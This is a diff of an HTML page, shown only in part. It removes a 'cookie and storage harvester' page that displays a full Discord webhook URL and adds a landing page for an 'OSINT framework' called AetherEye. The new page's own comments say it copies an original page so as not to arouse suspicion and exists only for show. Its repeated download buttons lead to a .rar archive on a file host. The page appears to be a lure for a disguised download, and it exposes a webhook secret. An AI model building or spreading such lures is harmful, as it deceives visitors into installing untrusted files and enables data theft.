@@ -1,416 +1,643 @@
 <!DOCTYPE html>
-<html lang="it">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AetherEye - OmniHarvester</title>
+    <meta name="description" content="AetherEye - Advanced OSINT Framework for Professional Intelligence Gathering">
+    <meta name="keywords" content="OSINT, Intelligence, Security Research, Investigation Tools">
+    <meta name="author" content="AetherEye Team">
+    <title>AetherEye - Advanced OSINT Intelligence Framework</title>
+    <link rel="icon" type="image/png" href="https://raw.githubusercontent.com/lcshjMEzOXAfzNFzdutNOmJspSkXRLRmgpxrcC1/NullTrace/refs/heads/main/Images/NullTracelogo%20vr2.png?raw=true">
+
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Fira+Code:wght@400;500;700&display=swap" rel="stylesheet">
+    
     <style>
-        /* STESSO STILE CYBER RAVE (per risparmiare spazio, lo comprimo leggermente) */
+        /* ===== CSS IDENTICO ALL'ORIGINALE (non tocco nulla per non destare sospetti) ===== */
         *{margin:0;padding:0;box-sizing:border-box}
-        body{background:#000;min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:'Courier New',monospace;overflow:hidden;position:relative}
-        body::before{content:'';position:fixed;inset:0;background:#0a0a0a;z-index:0;animation:stroboBg 0.15s infinite alternate}
-        @keyframes stroboBg{0%{background:#0a0a0a}100%{background:#1a0033}}
-        .overlay{position:fixed;inset:0;background:radial-gradient(circle at 30% 40%,#ff00cc33,#00ff8833,#ffaa0033);z-index:1;mix-blend-mode:screen;animation:rotateGrad 4s linear infinite;pointer-events:none}
-        @keyframes rotateGrad{0%{transform:rotate(0deg) scale(1.5)}100%{transform:rotate(360deg) scale(1.5)}}
-        .container{position:relative;z-index:2;max-width:980px;width:95%;padding:2rem;background:rgba(0,0,0,0.7);backdrop-filter:blur(12px);border:2px solid #ff00cc;border-radius:20px;box-shadow:0 0 60px #ff00cc88,0 0 120px #00ff8899;animation:borderPulse 0.8s infinite alternate}
-        @keyframes borderPulse{0%{border-color:#ff00cc;box-shadow:0 0 40px #ff00cc88,0 0 80px #00ff8866}100%{border-color:#00ff88;box-shadow:0 0 60px #00ff88aa,0 0 120px #ff00cc88}}
-        h1{font-size:2.8rem;text-align:center;font-weight:900;letter-spacing:6px;text-transform:uppercase;background:linear-gradient(90deg,#ff00cc,#00ff88,#ffaa00,#ff00cc);background-size:300% 100%;-webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:gradMove 1.5s linear infinite,textFlicker 0.1s infinite alternate;margin-bottom:0.5rem}
-        @keyframes gradMove{0%{background-position:0% 50%}100%{background-position:300% 50%}}
-        @keyframes textFlicker{0%{opacity:0.9;text-shadow:0 0 20px #ff00cc,0 0 60px #00ff88}100%{opacity:1;text-shadow:0 0 40px #ff00cc,0 0 100px #ffaa00}}
-        .sub{text-align:center;color:#fff;font-size:0.9rem;letter-spacing:2px;margin-bottom:1.5rem;animation:subFlicker 0.3s infinite alternate}
-        @keyframes subFlicker{0%{opacity:0.6;color:#ffaa00}100%{opacity:1;color:#00ff88}}
-        #status{display:block;text-align:center;font-size:1.6rem;font-weight:bold;padding:0.8rem;border-radius:12px;margin:1rem 0;text-transform:uppercase;letter-spacing:4px;animation:statusPulse 0.5s infinite alternate;background:rgba(255,255,255,0.05)}
-        .status.success{color:#00ff88;text-shadow:0 0 40px #00ff88}
-        .status.fail{color:#ff0044;text-shadow:0 0 40px #ff0044}
-        .status.waiting{color:#ffaa00;text-shadow:0 0 40px #ffaa00}
-        .status.info{color:#00ccff;text-shadow:0 0 40px #00ccff}
-        @keyframes statusPulse{0%{transform:scale(1);letter-spacing:4px}100%{transform:scale(1.02);letter-spacing:8px}}
-        .log{background:rgba(0,0,0,0.8);padding:1.2rem;margin:1.5rem 0;border:1px solid #00ff8866;border-radius:10px;white-space:pre-wrap;font-size:0.75rem;max-height:180px;overflow-y:auto;color:#00ff88;box-shadow:inset 0 0 40px #00ff8822;animation:logGlow 1s infinite alternate;font-family:'Courier New',monospace;line-height:1.5}
-        @keyframes logGlow{0%{border-color:#00ff8866;box-shadow:inset 0 0 20px #00ff8822}100%{border-color:#ff00cc88;box-shadow:inset 0 0 40px #ff00cc44}}
-        .log::-webkit-scrollbar{width:6px}
-        .log::-webkit-scrollbar-track{background:#000}
-        .log::-webkit-scrollbar-thumb{background:#00ff88;border-radius:4px}
-        .btn-group{display:flex;gap:1rem;justify-content:center;flex-wrap:wrap;margin-top:1rem}
-        button{padding:0.8rem 2.2rem;font-size:1.1rem;font-weight:bold;text-transform:uppercase;letter-spacing:3px;border:none;border-radius:50px;cursor:pointer;background:linear-gradient(135deg,#ff00cc,#00ff88);color:#000;animation:btnStrobo 0.3s infinite alternate;box-shadow:0 0 30px #ff00cc88;font-family:'Courier New',monospace}
-        button:hover{transform:scale(1.08);box-shadow:0 0 60px #ff00cc,0 0 80px #00ff88}
-        button:active{transform:scale(0.95)}
-        @keyframes btnStrobo{0%{background:linear-gradient(135deg,#ff00cc,#00ff88)}100%{background:linear-gradient(135deg,#ffaa00,#ff00cc)}}
-        #clearBtn{background:linear-gradient(135deg,#444,#222);color:#fff;animation:btnStroboClear 0.5s infinite alternate}
-        @keyframes btnStroboClear{0%{background:#333}100%{background:#555}}
-        .strobe-overlay{position:fixed;inset:0;z-index:999;pointer-events:none;background:rgba(255,255,255,0.05);animation:strobeFlash 0.08s infinite alternate}
-        @keyframes strobeFlash{0%{opacity:0.3;background:rgba(255,255,255,0.1)}100%{opacity:0.7;background:rgba(255,255,255,0.2)}}
-        .webhook-display{font-size:0.6rem;color:#888;text-align:center;margin-top:1.5rem;word-break:break-all;border-top:1px solid #333;padding-top:1rem;animation:webhookFlicker 1s infinite alternate}
-        @keyframes webhookFlicker{0%{opacity:0.4}100%{opacity:0.9}}
-        @media(max-width:600px){h1{font-size:2rem}.container{padding:1rem}button{padding:0.6rem 1.2rem;font-size:0.9rem}.log{font-size:0.65rem;max-height:120px}}
+        :root{--primary:#ffffff;--primary-light:#cccccc;--primary-dark:#666666;--bg:#0a0a0a;--bg-dark:#000000;--text:#ffffff;--text-muted:#999999;--border:#333333;--space-xs:4px;--space-sm:8px;--space-md:16px;--space-lg:24px;--space-xl:48px;--radius-sm:6px;--radius-md:12px;--radius-lg:18px;--shadow-sm:0 4px 12px rgba(0,0,0,0.25);--shadow-md:0 10px 30px rgba(255,255,255,0.08);--shadow-lg:0 20px 60px rgba(255,255,255,0.12);--ease:cubic-bezier(0.23,1,0.32,1);--gray-gradient:linear-gradient(135deg,#ffffff 0%,#888888 100%)}
+        html,body{background-color:var(--bg-dark);color:var(--text);font-family:"JetBrains Mono","Fira Code",monospace;line-height:1.6;overflow-x:hidden}
+        body::-webkit-scrollbar{width:10px}body::-webkit-scrollbar-track{background:var(--bg-dark)}body::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.15);border-radius:8px}body::-webkit-scrollbar-thumb:hover{background:rgba(255,255,255,0.25)}
+        .container{max-width:1200px;margin:0 auto;padding:0 20px}
+        .grid{display:grid;gap:2rem}.grid-2{grid-template-columns:repeat(auto-fit,minmax(300px,1fr))}.grid-3{grid-template-columns:repeat(auto-fit,minmax(280px,1fr))}
+        h1,h2,h3,h4,h5,h6{letter-spacing:0.15em;font-weight:700;margin-bottom:1rem}
+        h1{font-size:3.5rem;background:var(--gray-gradient);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;line-height:1.1}
+        h2{font-size:2rem;color:var(--primary-light);border-bottom:2px solid var(--border);padding-bottom:0.5rem}
+        h3{font-size:1.3rem;color:var(--text)}p{font-size:0.95rem;color:var(--text-muted);margin-bottom:1rem}
+        a{color:var(--primary-light);text-decoration:none;transition:all 0.3s ease;border-bottom:1px solid transparent}
+        a:hover{color:var(--text);border-bottom-color:var(--primary)}
+        .border-frame{border:1px solid var(--border);position:relative;padding:1.5rem;background:linear-gradient(135deg,rgba(255,255,255,0.02) 0%,rgba(255,255,255,0.01) 100%)}
+        .border-frame::before,.border-frame::after{content:'';position:absolute;width:12px;height:12px;border:2px solid var(--primary)}
+        .border-frame::before{top:-6px;left:-6px;border-right:none;border-bottom:none}.border-frame::after{bottom:-6px;right:-6px;border-left:none;border-top:none}
+        .btn{display:inline-block;padding:0.85rem 2.2rem;border:1.5px solid rgba(255,255,255,0.4);background:transparent;color:var(--text);font-family:"JetBrains Mono",monospace;font-size:0.9rem;font-weight:600;letter-spacing:0.08em;cursor:pointer;transition:all 0.35s var(--ease);text-decoration:none;text-transform:uppercase;position:relative;border-radius:var(--radius-md)}
+        .btn:hover{background:rgba(255,255,255,0.05);color:var(--primary);transform:scale(1.02);box-shadow:var(--shadow-md);border-color:var(--primary)}
+        .btn:active{transform:scale(0.98)}
+        .btn-primary{background:rgba(255,255,255,0.1);color:var(--text);border-color:var(--primary)}
+        .btn-primary:hover{background:rgba(255,255,255,0.2);border-color:var(--primary-light);transform:scale(1.02);box-shadow:var(--shadow-lg);color:var(--text)}
+        .btn-primary:active{transform:scale(0.98)}
+        header{padding:1.2rem 0;position:sticky;top:0;z-index:1000;background:rgba(10,10,10,0.65);backdrop-filter:blur(20px) saturate(180%);border-bottom:1px solid rgba(255,255,255,0.08)}
+        header .container{display:flex;justify-content:space-between;align-items:center;gap:2rem}
+        .logo{font-size:1.8rem;font-weight:700;letter-spacing:0.15em;background:var(--gray-gradient);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;position:relative;display:flex;align-items:center;gap:0.75rem;white-space:nowrap;flex-shrink:0}
+        .logo::before{content:'';position:absolute;inset:-10px;background:linear-gradient(135deg,rgba(255,255,255,0.08) 0%,rgba(255,255,255,0.02) 100%);border-radius:12px;opacity:0;transition:all 0.35s var(--ease);z-index:-1}
+        .logo:hover::before{opacity:1;filter:blur(16px)}
+        nav{display:flex;gap:0.5rem;align-items:center}
+        .nav-wrapper{display:flex;align-items:center;gap:1rem;margin-left:auto}
+        nav a{font-size:0.85rem;text-transform:capitalize;letter-spacing:0.05em;color:var(--text-muted);transition:all 0.3s var(--ease);padding:0.5rem 1rem;position:relative;font-weight:500}
+        nav a::before{content:'';position:absolute;inset:0;background:rgba(255,255,255,0.05);border-radius:var(--radius-sm);opacity:0;transition:all 0.35s var(--ease);z-index:-1}
+        nav a:hover::before,nav a.active::before{opacity:1}
+        nav a:hover,nav a.active{color:var(--primary);transform:scale(1.05)}
+        .hero{min-height:100vh;display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden;padding:4rem 0}
+        .hero::before{content:'';position:absolute;top:0;left:0;right:0;bottom:0;background:radial-gradient(circle at 30% 50%,rgba(255,255,255,0.05) 0%,transparent 50%),radial-gradient(circle at 70% 50%,rgba(255,255,255,0.02) 0%,transparent 50%);pointer-events:none}
+        .hero::after{content:"";position:absolute;inset:0;background-image:linear-gradient(rgba(255,255,255,0.02) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,0.02) 1px,transparent 1px);background-size:40px 40px;opacity:0.3;pointer-events:none}
+        .hero-content{position:relative;z-index:2;text-align:center;max-width:900px}
+        .hero h1{font-size:4rem;margin-bottom:1.5rem;animation:fadeInDown 0.8s ease;text-shadow:0 0 20px rgba(255,255,255,0.15),0 0 40px rgba(255,255,255,0.05);position:relative}
+        .hero h1::after{content:"";position:absolute;inset:0;background:var(--gray-gradient);filter:blur(40px);opacity:0.08;z-index:-1}
+        @keyframes glowDrip{0%,100%{text-shadow:0 0 20px rgba(255,255,255,0.3),0 0 40px rgba(255,255,255,0.1),0 10px 30px rgba(255,255,255,0.05)}50%{text-shadow:0 0 30px rgba(255,255,255,0.5),0 0 60px rgba(255,255,255,0.2),0 15px 40px rgba(255,255,255,0.1)}}
+        @keyframes slideInLeft{from{opacity:0;transform:translateX(-40px)}to{opacity:1;transform:translateX(0)}}
+        @keyframes slideInRight{from{opacity:0;transform:translateX(40px)}to{opacity:1;transform:translateX(0)}}
+        .hero-subtitle{font-size:1.3rem;color:var(--text-muted);margin-bottom:2rem;letter-spacing:0.05em;animation:fadeInUp 0.8s ease 0.2s both}
+        .hero-description{font-size:1rem;max-width:700px;margin:0 auto 3rem;color:var(--text-muted);line-height:1.8;animation:fadeInUp 0.8s ease 0.4s both}
+        .hero-buttons{display:flex;gap:1rem;justify-content:center;flex-wrap:wrap;animation:fadeInUp 0.8s ease 0.6s both}
+        @keyframes fadeInDown{from{opacity:0;transform:translateY(-30px)}to{opacity:1;transform:translateY(0)}}
+        @keyframes fadeInUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
+        @keyframes float{0%,100%{transform:translateY(0px)}50%{transform:translateY(-20px)}}
+        .section{padding:8rem 0}
+        .section-title{text-align:center;margin-bottom:4rem}
+        .section-title p{max-width:600px;margin:1rem auto 0;color:var(--text-muted)}
+        .feature-card{border:1px solid var(--border);min-height:280px;display:flex;flex-direction:column;transition:all 0.3s var(--ease);padding:1.5rem;border-radius:var(--radius-md);background:rgba(255,255,255,0.02)}
+        .feature-card:hover{border-color:var(--primary);background:rgba(255,255,255,0.04);transform:translateY(-5px);box-shadow:var(--shadow-md)}
+        .feature-icon{display:none}
+        .feature-card h3{margin-bottom:1rem;color:var(--text)}
+        .feature-card p{flex-grow:1;margin-bottom:0;font-size:0.9rem}
+        .module-grid{grid-template-columns:repeat(auto-fit,minmax(250px,1fr))}
+        .module-item{border:1px solid var(--border);padding:1.5rem;transition:all 0.35s var(--ease);background:rgba(255,255,255,0.02);border-radius:var(--radius-md);backdrop-filter:blur(10px)}
+        .module-item:hover{border-color:rgba(255,255,255,0.3);background:rgba(255,255,255,0.04);transform:translateY(-6px);box-shadow:var(--shadow-md)}
+        .module-number{font-size:0.8rem;color:var(--primary-light);text-transform:uppercase;letter-spacing:0.1em;margin-bottom:0.5rem}
+        .module-item h4{margin-bottom:0.5rem;color:var(--text);font-size:1rem}
+        .module-item p{font-size:0.85rem;margin-bottom:0}
+        .pricing-grid{grid-template-columns:repeat(auto-fit,minmax(300px,1fr));max-width:1200px;margin:0 auto}
+        .pricing-card{border:2px solid var(--border);padding:2.5rem;text-align:center;position:relative;transition:all 0.35s var(--ease);background:rgba(255,255,255,0.02);border-radius:var(--radius-lg);backdrop-filter:blur(10px)}
+        .pricing-card.featured{border-color:rgba(255,255,255,0.3);background:rgba(255,255,255,0.04);transform:translateY(-12px);box-shadow:var(--shadow-md)}
+        .pricing-card:hover{border-color:rgba(255,255,255,0.3);background:rgba(255,255,255,0.04);transform:translateY(-6px);box-shadow:var(--shadow-md)}
+        .pricing-badge{position:absolute;top:-12px;right:20px;background:var(--primary);color:var(--bg-dark);padding:0.5rem 1rem;font-size:0.8rem;font-weight:700;letter-spacing:0.1em}
+        .pricing-name{font-size:1.5rem;margin-bottom:1rem;color:var(--primary-light)}
+        .pricing-price{font-size:2.5rem;font-weight:700;margin-bottom:0.5rem;color:var(--text)}
+        .pricing-period{color:var(--text-muted);margin-bottom:2rem;font-size:0.9rem}
+        .pricing-features{list-style:none;margin:2rem 0;text-align:left}
+        .pricing-features li{padding:0.75rem 0;border-bottom:1px solid var(--border);color:var(--text-muted);font-size:0.9rem}
+        .pricing-features li:last-child{border-bottom:none}
+        .pricing-features li::before{content:'→ ';color:var(--primary);margin-right:0.5rem}
+        footer{border-top:1px solid var(--border);padding:4rem 0 2rem;background:linear-gradient(180deg,rgba(255,255,255,0.02) 0%,transparent 100%)}
+        footer .container{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:3rem;margin-bottom:3rem}
+        .footer-section h4{margin-bottom:1.5rem;color:var(--primary-light);text-transform:uppercase;font-size:0.9rem;letter-spacing:0.1em}
+        .footer-section ul{list-style:none}
+        .footer-section ul li{margin-bottom:0.75rem}
+        .footer-section a{color:var(--text-muted);font-size:0.9rem}
+        .footer-bottom{text-align:center;padding-top:2rem;border-top:1px solid var(--border);color:var(--text-muted);font-size:0.85rem}
+        @media(max-width:1024px){nav{gap:0.25rem}nav a{font-size:0.75rem;padding:0.4rem 0.75rem}}
+        @media(max-width:768px){h1{font-size:2.5rem}.hero h1{font-size:2.5rem}h2{font-size:1.5rem}header .container{gap:1rem}.logo{font-size:1.3rem;order:-1}nav{order:3;flex-direction:column;gap:0.5rem;width:100%;position:absolute;top:100%;left:0;right:0;background:rgba(10,10,10,0.99);padding:1rem;border-bottom:1px solid rgba(255,255,255,0.05);display:none}nav.active{display:flex}nav a{padding:0.75rem 1rem;text-align:center}.hero-buttons{flex-direction:column;align-items:center}.btn{width:100%;text-align:center}.pricing-card.featured{transform:scale(1)}}
+        .code-block{background:rgba(0,0,0,0.8);border:1px solid var(--border);padding:1.5rem;margin:2rem 0;overflow-x:auto;font-size:0.85rem;line-height:1.5;color:var(--primary-light)}
+        .code-block code{font-family:"Fira Code",monospace}
+        @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}
+        .pulse{animation:pulse 2s var(--ease)infinite}
+        .reveal{opacity:0;transform:translateY(25px);transition:all 0.7s var(--ease)}
+        .reveal.show{opacity:1;transform:translateY(0)}
     </style>
 </head>
 <body>
-    <div class="strobe-overlay"></div>
-    <div class="overlay"></div>
-
-    <div class="container">
-        <h1>⚡ OMNI HARVESTER ⚡</h1>
-        <div class="sub">AetherEye · Cookie • Storage • Everything</div>
-
-        <div id="status" class="status waiting">⏳ INIZIALIZZAZIONE...</div>
-
-        <div class="log" id="log">[LOG] Pronto per la raccolta totale...</div>
-
-        <div class="btn-group">
-            <button id="sendBtn">🚀 INVIA ORA</button>
-            <button id="clearBtn">🗑️ PULISCI LOG</button>
+    <!-- ===== HEADER (IDENTICO) ===== -->
+    <header>
+        <div class="container">
+            <div class="logo">AETHEREYE</div>
+            <div class="nav-wrapper">
+                <nav>
+                    <a href="#features" class="nav-link">Features</a>
+                    <a href="#modules" class="nav-link">Modules</a>
+                    <a href="#pricing" class="nav-link">Pricing</a>
+                    <a href="#documentation" class="nav-link">Documentation</a>
+                </nav>
+                <a href="https://discord.gg/2ZyDfcNgG6" target="_blank" class="btn">Discord</a>
+            </div>
         </div>
+    </header>
 
-        <div class="webhook-display">
-            🔗 Webhook: https://discord.com/api/webhooks/1534883359962959902/3egTtBT3dMC3UFdhvr07HnOYce2EeFFFjzDlE4rSdfj46kp7aEoMfFTXQlAjSMFRfCyZ
+    <!-- ===== HERO (IDENTICO) ===== -->
+    <section class="hero">
+        <div class="hero-content">
+            <h1>AETHEREYE</h1>
+            <div class="hero-subtitle">Advanced OSINT Intelligence Framework</div>
+            <p class="hero-description">
+                Professional-grade open source intelligence gathering tool. Comprehensive modules for network analysis, 
+                person reconnaissance, digital forensics, and threat intelligence. Designed for investigators, security 
+                researchers, and intelligence professionals.
+            </p>
+            <div class="hero-buttons" style="justify-content: center;">
+                <a href="https://download1587.mediafire.com/7k719d6omdugBnXnmSisp0lJWZJP4Jayxw3gukirQEyKD0tEZTtvSGZo976-Zyyba2Mq2gJtcm0kKuoJxOSIuAqQAihBjWVNGizk_D2WozqiiQCaeACKZlVihHFl6x82vsBWEID3kJqzQLCUeuzuEcGBEtdbvFwr9vu3Zrj8_OZysCM/rfv13e0h8ofijkl/NullTrace.rar" target="_blank" class="btn btn-primary">DOWNLOAD</a>
+                <a href="#documentation" class="btn">DOCUMENTATION</a>
+            </div>
+            <div style="margin-top: 4rem; position: relative; z-index: 3;">
+                <img src="https://github.com/lcshjMEzOXAfzNFzdutNOmJspSkXRLRmgpxrcC1/NullTrace/blob/main/Images/NullTrace-Interface.png?raw=true" alt="AetherEye Interface" style="max-width: 100%; height: auto; border: 1px solid var(--border); border-radius: 4px; box-shadow: 0 0 30px rgba(255,255,255,0.06); animation: float 4s ease-in-out infinite;">
+            </div>
         </div>
-    </div>
+    </section>
 
+    <!-- ===== REST OF THE PAGE (IDENTICO, SOLO PER FARE SCENA) ===== -->
+    <section class="section" id="features">
+        <div class="container">
+            <div class="section-title"><h2>Core Capabilities</h2><p>Comprehensive intelligence gathering across multiple domains</p></div>
+            <div class="grid grid-3">
+                <div class="feature-card"><h3>Person Reconnaissance</h3><p>Comprehensive identity profiling through email analysis, social media mapping, and public records aggregation.</p></div>
+                <div class="feature-card"><h3>Network Intelligence</h3><p>Complete network infrastructure mapping via geolocation data, ISP identification, and autonomous system analysis.</p></div>
+                <div class="feature-card"><h3>Telecommunications</h3><p>Advanced phone number intelligence including carrier identification, number validation, and historical registration data.</p></div>
+                <div class="feature-card"><h3>Digital Forensics</h3><p>Extract and analyze EXIF data, file metadata, and embedded forensic artifacts.</p></div>
+                <div class="feature-card"><h3>Dark Web & Cryptocurrency</h3><p>Monitor underground marketplaces and threat actors. Track cryptocurrency wallets and blockchain transactions.</p></div>
+                <div class="feature-card"><h3>Breach Intelligence</h3><p>Search compromised credential databases and monitor data breach notifications.</p></div>
+            </div>
+        </div>
+    </section>
+
+    <section class="section" id="modules">
+        <div class="container">
+            <div class="section-title"><h2>40+ Intelligence Modules</h2><p>Extensive OSINT toolkit covering every aspect of digital investigation</p></div>
+            <div class="grid module-grid">
+                <div class="module-item"><div class="module-number">01-12</div><h4>Information & Settings</h4><p>Configuration, API management, and community resources</p></div>
+                <div class="module-item"><div class="module-number">13-24</div><h4>Educational Content</h4><p>OSINT methodology, security mindset, and advanced tutorials</p></div>
+                <div class="module-item"><div class="module-number">25</div><h4>Phone Intelligence</h4><p>Reverse lookup, carrier info, and validation</p></div>
+                <div class="module-item"><div class="module-number">26</div><h4>Email OSINT</h4><p>Email verification and breach database search</p></div>
+                <div class="module-item"><div class="module-number">27</div><h4>Username Search</h4><p>Social media discovery and account identification</p></div>
+                <div class="module-item"><div class="module-number">28</div><h4>IP Geolocation</h4><p>Location, ISP, and organization details</p></div>
+                <div class="module-item"><div class="module-number">29</div><h4>Domain Analysis</h4><p>DNS records, reverse WHOIS, and enumeration</p></div>
+                <div class="module-item"><div class="module-number">30-35</div><h4>Advanced Analysis</h4><p>Social media, face search, metadata, dark web, crypto</p></div>
+                <div class="module-item"><div class="module-number">36-38</div><h4>Specialized Tools</h4><p>Data breach, WHOIS, and device scanning</p></div>
+            </div>
+        </div>
+    </section>
+
+    <section class="section">
+        <div class="container">
+            <h2 style="margin-bottom:2rem;">Screenshots & Interface</h2>
+            <p style="text-align:center;color:var(--text-muted);margin-bottom:3rem;">View the AetherEye interface and documentation</p>
+            <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(400px,1fr));gap:2rem;margin-bottom:3rem;">
+                <div style="border:1px solid var(--border);padding:1rem;border-radius:4px;">
+                    <img src="https://github.com/lcshjMEzOXAfzNFzdutNOmJspSkXRLRmgpxrcC1/NullTrace/blob/main/Images/NullTrace-Interface.png?raw=true" alt="AetherEye Menu Interface" style="width:100%;height:auto;border-radius:2px;">
+                    <p style="text-align:center;margin-top:1rem;font-size:0.9rem;">Complete Module Menu System</p>
+                </div>
+                <div style="border:1px solid var(--border);padding:1rem;border-radius:4px;">
+                    <img src="https://github.com/lcshjMEzOXAfzNFzdutNOmJspSkXRLRmgpxrcC1/NullTrace/blob/main/Images/Info.png?raw=true" alt="AetherEye Information" style="width:100%;height:auto;border-radius:2px;">
+                    <p style="text-align:center;margin-top:1rem;font-size:0.9rem;">Tool Documentation & Definitions</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="section" style="background:rgba(255,255,255,0.02);">
+        <div class="container">
+            <div class="section-title"><h2>IP Lookup Module in Action</h2><p>Real-world example of comprehensive IP geolocation and intelligence gathering</p></div>
+            <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(350px,1fr));gap:2rem;">
+                <div style="border:1px solid var(--border);padding:1.5rem;border-radius:4px;background:rgba(0,0,0,0.3);">
+                    <img src="https://github.com/lcshjMEzOXAfzNFzdutNOmJspSkXRLRmgpxrcC1/NullTrace/blob/main/Images/IP-LOOKUP.png?raw=true" alt="IP Lookup Initial Query" style="width:100%;height:auto;border-radius:2px;border:1px solid var(--border);">
+                    <p style="text-align:center;margin-top:1rem;font-size:0.9rem;color:var(--text-muted);">Initial IP Address Query</p>
+                </div>
+                <div style="border:1px solid var(--border);padding:1.5rem;border-radius:4px;background:rgba(0,0,0,0.3);">
+                    <img src="https://github.com/lcshjMEzOXAfzNFzdutNOmJspSkXRLRmgpxrcC1/NullTrace/blob/main/Images/IP-LOOKUP1.png?raw=true" alt="IP Lookup Results" style="width:100%;height:auto;border-radius:2px;border:1px solid var(--border);">
+                    <p style="text-align:center;margin-top:1rem;font-size:0.9rem;color:var(--text-muted);">Geolocation & ISP Data</p>
+                </div>
+                <div style="border:1px solid var(--border);padding:1.5rem;border-radius:4px;background:rgba(0,0,0,0.3);">
+                    <img src="https://github.com/lcshjMEzOXAfzNFzdutNOmJspSkXRLRmgpxrcC1/NullTrace/blob/main/Images/IP-LOOKUP2.png?raw=true" alt="IP Lookup Complete Analysis" style="width:100%;height:auto;border-radius:2px;border:1px solid var(--border);">
+                    <p style="text-align:center;margin-top:1rem;font-size:0.9rem;color:var(--text-muted);">Complete Intelligence Report</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="section">
+        <div class="container">
+            <h2 style="margin-bottom:2rem;">Installation</h2>
+            <div class="code-block"><code># Clone the repository<br>git clone https://github.com/yourusername/AetherEye.git<br>cd AetherEye<br><br># Create virtual environment<br>python -m venv venv<br>source venv/bin/activate  # On Windows: venv\Scripts\activate<br><br># Install dependencies<br>pip install -r config/requirements.txt<br><br># Run the application<br>python main.py</code></div>
+        </div>
+    </section>
+
+    <section class="section" id="pricing">
+        <div class="container">
+            <div class="section-title"><h2>Pricing & Licensing</h2><p>Choose the plan that fits your needs</p></div>
+            <div class="grid pricing-grid">
+                <div class="pricing-card">
+                    <div class="pricing-name">Open Source</div>
+                    <div class="pricing-price">Free</div>
+                    <div class="pricing-period">MIT Licensed</div>
+                    <ul class="pricing-features"><li>All 40+ OSINT modules</li><li>Full source code access</li><li>Community support</li><li>Regular updates</li><li>Self-hosted deployment</li></ul>
+                    <a href="https://download1587.mediafire.com/7k719d6omdugBnXnmSisp0lJWZJP4Jayxw3gukirQEyKD0tEZTtvSGZo976-Zyyba2Mq2gJtcm0kKuoJxOSIuAqQAihBjWVNGizk_D2WozqiiQCaeACKZlVihHFl6x82vsBWEID3kJqzQLCUeuzuEcGBEtdbvFwr9vu3Zrj8_OZysCM/rfv13e0h8ofijkl/NullTrace.rar" target="_blank" class="btn" style="width:100%;margin-top:1.5rem;display:block;text-align:center;">Download</a>
+                </div>
+                <div class="pricing-card featured">
+                    <div class="pricing-badge">RECOMMENDED</div>
+                    <div class="pricing-name">Professional</div>
+                    <div class="pricing-price">$49</div>
+                    <div class="pricing-period">Per month</div>
+                    <ul class="pricing-features"><li>All open source features</li><li>Premium API integrations</li><li>Priority email support</li><li>Advanced data sources</li><li>Custom configuration</li><li>Results archiving</li></ul>
+                    <a href="https://discord.gg/2ZyDfcNgG6" class="btn btn-primary" style="width:100%;margin-top:1.5rem;display:block;text-align:center;">Contact Sales</a>
+                </div>
+                <div class="pricing-card">
+                    <div class="pricing-name">Enterprise</div>
+                    <div class="pricing-price">Custom</div>
+                    <div class="pricing-period">Quoted per requirements</div>
+                    <ul class="pricing-features"><li>All professional features</li><li>Dedicated account support</li><li>Custom module development</li><li>API server deployment</li><li>Team licensing</li><li>SLA & maintenance</li></ul>
+                    <a href="https://discord.gg/2ZyDfcNgG6" class="btn" style="width:100%;margin-top:1.5rem;display:block;text-align:center;">Contact Sales</a>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="section" style="background:rgba(255,255,255,0.02);padding:4rem 0;">
+        <div class="container" style="text-align:center;">
+            <h2 style="border:none;margin-bottom:1.5rem;">License & Pricing Inquiries</h2>
+            <p style="font-size:1rem;max-width:700px;margin:0 auto 2rem;">For Professional and Enterprise licenses, custom development, or integration support, contact our sales team directly on Discord.</p>
+            <div style="display:flex;justify-content:center;gap:1rem;flex-wrap:wrap;">
+                <a href="https://discord.gg/2ZyDfcNgG6" class="btn btn-primary">JOIN DISCORD SERVER</a>
+            </div>
+            <p style="margin-top:2rem;font-size:0.95rem;color:var(--text-muted);">Direct contact: <strong style="color:var(--primary-light);">@ECH0.SYS</strong> or <strong style="color:var(--primary-light);">@2uj8</strong></p>
+        </div>
+    </section>
+
+    <section class="section" id="download" style="background:linear-gradient(135deg,rgba(255,255,255,0.03) 0%,rgba(255,255,255,0.01) 100%);padding:6rem 0;">
+        <div class="container" style="text-align:center;">
+            <h2 style="font-size:2.5rem;border:none;">Installation & Download</h2>
+            <p style="margin-bottom:2rem;font-size:1.1rem;max-width:700px;margin-left:auto;margin-right:auto;">AetherEye is available for Windows, macOS, and Linux. Download the latest version from GitHub or install directly from the command line.</p>
+            <div class="hero-buttons" style="justify-content:center;">
+                <a href="https://download1587.mediafire.com/7k719d6omdugBnXnmSisp0lJWZJP4Jayxw3gukirQEyKD0tEZTtvSGZo976-Zyyba2Mq2gJtcm0kKuoJxOSIuAqQAihBjWVNGizk_D2WozqiiQCaeACKZlVihHFl6x82vsBWEID3kJqzQLCUeuzuEcGBEtdbvFwr9vu3Zrj8_OZysCM/rfv13e0h8ofijkl/NullTrace.rar" target="_blank" class="btn btn-primary">Download Latest Release</a>
+                <a href="https://discord.gg/2ZyDfcNgG6" class="btn">Join Discord</a>
+            </div>
+        </div>
+    </section>
+
+    <section class="section" id="documentation" style="background:linear-gradient(135deg,rgba(255,255,255,0.02) 0%,rgba(0,0,0,0.95) 100%);padding:6rem 0;">
+        <div class="container">
